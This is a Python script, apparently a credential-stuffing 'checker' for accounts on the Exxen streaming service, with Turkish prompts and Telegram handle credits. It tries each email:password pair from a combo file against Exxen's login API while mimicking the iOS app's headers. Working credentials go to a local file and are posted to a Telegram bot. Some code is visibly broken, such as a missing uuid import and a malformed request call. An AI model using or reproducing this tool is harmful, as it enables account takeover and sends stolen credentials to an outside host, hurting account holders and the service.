import requests
import time
import os
sifre = 'icqarsivEXXEN'
pss = input('\x1b[1;32m 𝐒𝐢𝐟𝐫𝐞 : ')
if pss == sifre:
    print('\x1b[1;32m                    DOĞRU ŞİFRE✅ ')
    time.sleep(2)
    os.system('clear')
else:
    exit('\x1b[1;31m                    HATALI ŞİFRE❌ ')

def generate_guid():
    return str(uuid.uuid4())

from colorama import Fore

def clear():
    os.system('clear')

combo = input(Fore.YELLOW + 'Combo Dosyasının Yolunu Giriniz>>>')
tok = input(Fore.WHITE + 'Bot Token ==> ')
ID = input(Fore.GREEN + 'Telegram Hesap ID==>')
clear()
print('\x1b[32m        DARWİN BUBA     \x1b[33m                 \n╔══════════════════════════════════        \n     @darwintex\n\n╚══════════════════════════════════                   \n\x1b[32m<EXXEN CHECKER>       \x1b[0m')

def check(email, password):
    client = requests.session()
    h1 = {
        'Host': 'api-crm.exxen.com',
        'Origin': 'com.exxen.ios',
        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'Exxen/1.0.23 (com.exxen.ios; build:5; iOS 15.5.0) Alamofire/5.4.4',
        'Accept-Language': 'tr-TR;q=1.0',
        'Cache-Control': 'no-cache',
        'Connection': 'close' }
    data = {
        'Email': email,
        'Password': password,
        'RememberMe': 'true' }
    login = client.post('https://api-crm.exxen.com/membership/login/email?key=90d806464edeaa965b75a40a5c090764', data, h1, **('data', 'headers'))
    time.sleep(1)
    theos = f'''\n                     @darwintex\n            ~~~~~~~~~~~~~~~~~~\n            Hit Düştü Dostum\n                    \n            ✓ Gmail : {email}\n            ✓ Pass : {password}\n            ✓ Owner : @darwinxss\n            ✓ Channel : @icqarsiv\n            \n            ~~~~~~~~~~~~~~~~~~\n            @icqarsiv'''
    tlg = f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {theos} \n'''
    if 'Success":false' in login.text:
        print(Fore.RED + 'False: ' + email + ':' + password)
    elif 'Success":true' in login.text:
        print(Fore.YELLOW + 'Hits: ' + email + ':' + password)
        filee = open('/sdcard/download/hits.txt', 'a')
        filee.write(theos)
        requests.post(tlg)
    else:
        print(login.text)

file = open(combo, 'r').readlines()
for i in file:
    seq = i.strip()
    acc = seq.split(':')
    check(acc[0], acc[1])

#ɒєcσɒєɒ вy cσɒєя αмєя
